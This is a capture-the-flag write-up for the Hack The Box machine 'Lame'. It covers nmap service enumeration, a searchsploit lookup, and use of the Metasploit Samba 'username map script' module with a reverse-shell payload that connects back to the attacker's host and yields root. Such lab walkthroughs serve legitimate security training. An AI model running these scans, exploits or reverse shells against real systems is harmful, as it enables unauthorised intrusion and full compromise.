# lame

| Hostname   | Difficulty |
| ---        | ---        |
| lame |            |

Machine IP: 10.10.10.3 :

```bash
TARGET=10.10.10.3       # lame IP address
```

## Initial Reconnaissance

### Ports and services
Let's start by enumerate the exposed services :

```shell
# -p- : ports to scan. "-" is for all ports
NMAP_TARGET=$TARGET # target to scan
# -T4 : timing template (0(slower) to 5(faster) )
# -Pn : Treat all hosts as online -- skip host discovery
# --min-rate=1000 : Send packets no slower than <number> per second
NMAP_OUTPUT=$NMAP_TARGET-nmap-enumports # Save output to file(s)
nmap -p- $NMAP_TARGET -T4 -Pn --min-rate=1000 -oA $NMAP_OUTPUT
```

Result:

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 21:52 CEST
Nmap scan report for 10.10.10.3
Host is up (0.024s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 85.76 seconds
```

Let's enumerate deeper these services :

```shell
PORTS=21,22,139,445,3632 # ports to scan. "-" is for all ports. ex: 80,22
NMAP_TARGET=$TARGET # target to scan
# -T4 : 
# -Pn :
# --min-rate=1000 :
# -sC : 
# -sV : 
# -A :
NMAP_OUTPUT=$NMAP_TARGET-nmap-inspect # Save output to file(s)
nmap -p $PORTS -sC -sV -A $NMAP_TARGET -T4 --min-rate=1000 -oA $NMAP_OUTPUT
```

Result:

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 21:57 CEST
Nmap scan report for 10.10.10.3
Host is up (0.025s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m43s, deviation: 2h49m43s, median: 42s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-08-16T15:58:12-04:00

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   24.83 ms 10.10.14.1
2   25.22 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.99 seconds
```


We can notice the service "Samba smbd 3.0.20-Debian". we can search for a known vulnerability on this version :

```shell
searchsploit Samba 3.0
```

```text
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass      | multiple/remote/10095.txt
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Me | osx/remote/16875.rb
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command E | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                       | linux/remote/7701.txt
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Meta | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow ( | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow    | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow            | linux/remote/364.pl
Samba < 3.6.2 (x86) - Denial of Service (PoC)               | linux_x86/dos/36741.py
------------------------------------------------------------ ---------------------------------
```

We can have EDB-16320 ('Username' map script' Command Execution)
## Initial access

### Exploitation

Since this is ruby script, we can hope to find it under metasploit :

```text
msf6 > search username map

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/windows/imap/imail_delete           2004-11-12       average    No     IMail IMAP4D Delete Overflow
   1  exploit/windows/imap/mailenable_w3c_select  2005-10-03       great      Yes    MailEnable IMAPD W3C Logging Buffer Overflow
   2  auxiliary/scanner/oracle/oracle_login                        normal     No     Oracle RDBMS Login Utility
   3  exploit/multi/samba/usermap_script          2007-05-14       excellent  No     Samba "username map script" Command Execution
   4  exploit/linux/imap/imap_uw_lsub             2000-04-16       good       Yes    UoW IMAP Server LSUB Buffer Overflow
```

"exploit/multi/samba/usermap_script" is a good guess !

```text
msf6 > use 3
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
```

we can configure it :

```text
msf6 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
LHOST => 10.10.14.14
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
```

now we can execute it :

```text
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.14:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo m5GCCCUEA3SAOOWs;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "m5GCCCUEA3SAOOWs\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (10.10.14.14:4444 -> 10.10.10.3:36440) at 2023-08-16 22:13:33 +0200
```

We have a shell :

```shell
whoami
root
id
uid=0(root) gid=0(root)
```

